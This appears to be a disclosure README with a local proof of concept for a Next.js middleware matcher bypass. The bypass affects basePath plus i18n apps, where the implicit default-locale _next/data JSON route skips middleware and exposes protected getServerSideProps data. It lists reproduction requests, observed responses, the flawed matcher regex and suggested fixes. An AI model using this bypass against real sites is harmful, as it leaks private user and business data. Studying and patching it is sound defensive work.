# Next.js middleware matcher bypass on implicit default-locale `_next/data` routes with `basePath` + `i18n`

Minimal local reproduction for a Next.js Pages Router middleware matcher bypass involving:

- `basePath`
- `i18n`
- default locale
- Pages Router `getServerSideProps`
- framework-generated `_next/data/<BUILD_ID>/<page>.json` routes
- middleware matcher protection

This PoC demonstrates that a middleware matcher protecting a SSR page can fail to match the implicit default-locale `_next/data` route for the same page.

The issue was reported to Vercel Open Source through HackerOne and closed as duplicate of a previously reported issue.

## Affected scenario

A Next.js Pages Router application uses:

```js
module.exports = {
  basePath: '/corp',
  trailingSlash: false,
  i18n: {
    locales: ['en', 'it', 'fr'],
    defaultLocale: 'en',
    localeDetection: false,
  },
}

A SSR page is protected by middleware:

export const config = {
  matcher: [
    '/base-admin/:path*',
  ],
}

The middleware blocks unconditionally with HTTP 451.

Therefore, any request that reaches the page without returning 451 demonstrates that the middleware matcher was bypassed.

Vulnerable behavior

This issue was reproduced on:

Next.js v16.2.4
Next.js v16.3.0-canary.11

The issue does not require a reverse proxy, custom headers, CORS, browser compromise, development mode, or destructive testing. It is exploitable with a normal GET request to a framework-generated _next/data URL.

Minimal affected setup

next.config.js:

module.exports = {
  basePath: '/corp',
  trailingSlash: false,
  i18n: {
    locales: ['en', 'it', 'fr'],
    defaultLocale: 'en',
    localeDetection: false,
  },
}

Protected SSR page: pages/base-admin.js

export async function getServerSideProps({ req, locale, resolvedUrl }) {
  const cookie = req.headers.cookie || ''

  return {
    props: {
      marker: 'BASE_ADMIN_PAGE',
      secret: 'BASE_ADMIN_SECRET_1777',
      cookieSeen: cookie || 'NULL',
      locale: locale || 'NULL',
      resolvedUrl: resolvedUrl || 'NULL',
    },
  }
}

export default function BaseAdminPage(props) {
  return (
    <pre>
      BASE_ADMIN_PAGE
      SECRET={props.secret}
      COOKIE_SEEN={props.cookieSeen}
      LOCALE={props.locale}
      RESOLVED_URL={props.resolvedUrl}
    </pre>
  )
}

Middleware: middleware.js

import { NextResponse } from 'next/server'

export function middleware(req) {
  return new NextResponse(
    'SIMPLE_MATCHER_HIT path=' + req.nextUrl.pathname +
    ' url=' + req.url +
    ' locale=' + req.nextUrl.locale +
    ' basePath=' + req.nextUrl.basePath,
    { status: 451 }
  )
}

export const config = {
  matcher: [
    '/base-admin/:path*',
  ],
}

The middleware blocks unconditionally. Therefore, any request matched by the middleware must return HTTP 451. This removes application-level authorization logic from the PoC and demonstrates that the vulnerable request does not hit the middleware matcher.

Steps To Reproduce
Install dependencies:
npm install
Build and start the application:
npm run build
npm run start
Get the build ID:
cat .next/BUILD_ID
Verify that the protected HTML route is intercepted by middleware:
GET /corp/base-admin

Observed:

HTTP/1.1 451 Unavailable For Legal Reasons
SIMPLE_MATCHER_HIT path=/base-admin url=http://localhost:3011/corp/base-admin locale=en basePath=/corp
Verify that the explicit default-locale HTML route is intercepted by middleware:
GET /corp/en/base-admin

Observed:

HTTP/1.1 451 Unavailable For Legal Reasons
SIMPLE_MATCHER_HIT path=/base-admin url=http://localhost:3011/corp/base-admin locale=en basePath=/corp
Verify that the explicit default-locale _next/data route is intercepted by middleware:
GET /corp/_next/data/<BUILD_ID>/en/base-admin.json

Observed:

HTTP/1.1 451 Unavailable For Legal Reasons
SIMPLE_MATCHER_HIT path=/base-admin url=http://localhost:3011/corp/base-admin locale=en basePath=/corp
Request the implicit default-locale _next/data route:
GET /corp/_next/data/<BUILD_ID>/base-admin.json

Observed:

HTTP/1.1 200 OK
Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
Content-Type: application/json; charset=utf-8

Response body:

{
  "pageProps": {
    "marker": "BASE_ADMIN_PAGE",
    "secret": "BASE_ADMIN_SECRET_1777",
    "cookieSeen": "NULL",
    "locale": "en",
    "resolvedUrl": "/base-admin"
  },
  "__N_SSP": true
}

The middleware is not hit, and the protected SSR pageProps are exposed.

Verify that a non-default locale _next/data route is intercepted:
GET /corp/_next/data/<BUILD_ID>/it/base-admin.json

Observed:

HTTP/1.1 451 Unavailable For Legal Reasons
SIMPLE_MATCHER_HIT path=/corp/it/base-admin url=http://localhost:3011/it/corp/it/base-admin locale=it basePath=
Why this appears to be a framework-level issue

The generated middleware matcher protects the HTML route and explicit locale data routes, but it does not protect the valid implicit default-locale data route.

The generated middleware manifest for matcher /base-admin/:path* contains:

originalSource: /base-admin/:path*
regexp: ^\/corp(?:\/(_next\/data\/[^/]{1,}))?(?:\/((?!_next\/)[^/.]{1,}))\/base-admin(?:\/((?:[^\/#\?]+?)(?:\/(?:[^\/#\?]+?))*))?(\\.json)?[\/#\?]?$

This regex matches routes such as:

/corp/_next/data/<BUILD_ID>/en/base-admin.json
/corp/_next/data/<BUILD_ID>/it/base-admin.json

However, it does not match the valid implicit default-locale route:

/corp/_next/data/<BUILD_ID>/base-admin.json

The router still resolves this URL to the protected SSR page /base-admin and returns its getServerSideProps JSON.

Supporting Material/References

I attached a minimal reproduction ZIP containing:

package.json
next.config.js
middleware.js
pages/base-admin.js
README.md
reproduce.sh

I also verified the issue on next@canary:

Next.js v16.3.0-canary.11
GET /corp/_next/data/<BUILD_ID>/base-admin.json
=> 200 OK, protected SSR JSON exposed

## Impact

In the PoC, the protected HTML route is correctly intercepted by middleware:

/corp/base-admin => 451 middleware hit

but the corresponding implicit default-locale data route bypasses middleware:

/corp/_next/data/<BUILD_ID>/base-admin.json => 200 JSON exposed

The exposed JSON contains:

{
  "pageProps": {
    "marker": "BASE_ADMIN_PAGE",
    "secret": "BASE_ADMIN_SECRET_1777",
    "cookieSeen": "NULL",
    "locale": "en",
    "resolvedUrl": "/base-admin"
  },
  "__N_SSP": true
}

In real applications, getServerSideProps often returns sensitive server-side data intended only for authenticated users, including:

user profile data
admin dashboard data
private business records
organization/account data
orders/customer data
internal metadata
other protected pageProps

The build ID is normally discoverable from public Next.js HTML/assets, so the bypass endpoint is predictable.

Suggested remediation:

Normalize implicit default-locale _next/data routes to the same pathname used for the corresponding HTML route before middleware/proxy matcher evaluation.
Adjust generated middleware matcher regexes so that default-locale data routes without an explicit locale segment are covered.
Add regression tests for basePath + i18n + Pages Router getServerSideProps + middleware matcher + implicit default-locale _next/data.

This PoC is intended for local, educational, and defensive testing only.

The issue was responsibly reported to Vercel Open Source and closed as duplicate of a previously submitted report.
